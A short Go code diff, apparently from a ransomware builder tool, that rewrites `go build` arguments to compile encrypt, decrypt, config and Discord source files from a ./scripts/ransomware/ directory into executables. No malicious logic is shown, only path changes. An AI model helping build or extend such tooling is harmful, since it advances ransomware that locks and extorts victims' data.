@@ -155,7 +155,8 @@ func main() {
 	}
 	defer os.Remove(tempMainFile)
 
-	buildArgs = append(buildArgs, "config.go", "encrypt.go", "decrypt.go", "discord.go", tempMainFile)
+	// Use relative path from project root: ./scripts/ransomware/
+	buildArgs = append(buildArgs, "./scripts/ransomware/config.go", "./scripts/ransomware/encrypt.go", "./scripts/ransomware/decrypt.go", "./scripts/ransomware/discord.go", "./scripts/ransomware/"+tempMainFile)
 
 	cmd := exec.Command("go", buildArgs...)
 	output, err := cmd.CombinedOutput()
@@ -219,7 +220,8 @@ func main() {
 	}
 	defer os.Remove(tempMainFile)
 
-	buildArgs := []string{"build", "-o", filename, "config.go", "decrypt.go", tempMainFile}
+	// Use relative path from project root: ./scripts/ransomware/
+	buildArgs := []string{"build", "-o", filename, "./scripts/ransomware/config.go", "./scripts/ransomware/decrypt.go", "./scripts/ransomware/" + tempMainFile}
 
 	cmd := exec.Command("go", buildArgs...)
 	output, err := cmd.CombinedOutput()
